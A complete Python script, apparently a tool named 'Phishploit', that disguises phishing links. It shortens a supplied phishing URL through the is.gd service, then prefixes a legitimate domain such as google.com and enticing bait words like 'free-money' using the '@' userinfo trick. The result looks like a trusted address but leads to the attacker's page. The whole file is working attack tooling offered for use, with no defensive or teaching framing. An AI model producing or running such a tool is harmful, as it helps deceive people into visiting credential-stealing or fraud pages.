import re
import urllib.request

#  ASCII color variables
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
RESET = '\033[0m'


print(f"{CYAN}"
'''    ____  __    _      __          __      _ __
   / __ \/ /_  (_)____/ /_  ____  / /___  (_) /_
  / /_/ / __ \/ / ___/ __ \/ __ \/ / __ \/ / __/
 / ____/ / / / (__  ) / / / /_/ / / /_/ / / /_
/_/   /_/ /_/_/____/_/ /_/ .___/_/\____/_/\__/                  '''+ RESET)
print("\033[42;91mThis tool is created by:\033[0m Cykamra\n\n.  ")


def validate_url_format(url):
    if not re.match(r'^https?://', url):
        print(f"{RED}[!] Invalid URL format. Please make sure it starts with http or https.{RESET}")
        exit(1)

# Input phishing URL
phishing_url = input(f"{YELLOW}Please enter the Phishing URL (starting with http or https): {RESET}")
validate_url_format(phishing_url)
print(f"{GREEN}Modifying the provided URL to a shortened version for better disguise...{RESET}")

# Shorten the URL
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'}
try:
    request = urllib.request.Request(f"https://is.gd/create.php?format=simple&url={phishing_url}", headers=headers)
    with urllib.request.urlopen(request) as response:
         shortened_url = response.read().decode().replace("https://", "")     
except:
    print(f'{RED}[!] please make sure you have internet connection{RESET}')
    exit(1) 
# Input mask domain
print(f"\n{CYAN}--- Masking Domain ---{RESET}")
mask_domain = input(f"{YELLOW}Enter a legitimate domain to mask the Phishing URL (starting with http or https), e.g., https://google.com or http://anything.org: {RESET}")
validate_url_format(mask_domain)

# Input social engineering words
print(f'\n{CYAN}To make the link more convincing, add some enticing words (e.g., free-money, best-pubg-tricks).{RESET}')
print(f"{YELLOW}Note: Use hyphens (-) between words; avoid spaces for smooth link generation.{RESET}")
social_engineering_words = input(f"{YELLOW}Enter your words: {RESET}")

# Validate social engineering words
if not social_engineering_words or " " in social_engineering_words:
    print(f"{RED}[!] Invalid input: Please ensure you use hyphens instead of spaces.{RESET}")
    print(f"\n{GREEN}Creating your disguised URL...{RESET}\n")
    final_url = f"{mask_domain}@{shortened_url}"
    print(f"{CYAN}Here's your crafted URL: {GREEN}{final_url} \n{RESET}")
    exit()

# Generate final masked URL
print(f"\n{GREEN}Crafting your fully disguised URL...{RESET}\n")
final_url = f"{mask_domain}-{social_engineering_words}@{shortened_url}"
print(f"{CYAN}Here is your final, masked URL: {GREEN}{final_url} \n{RESET}")
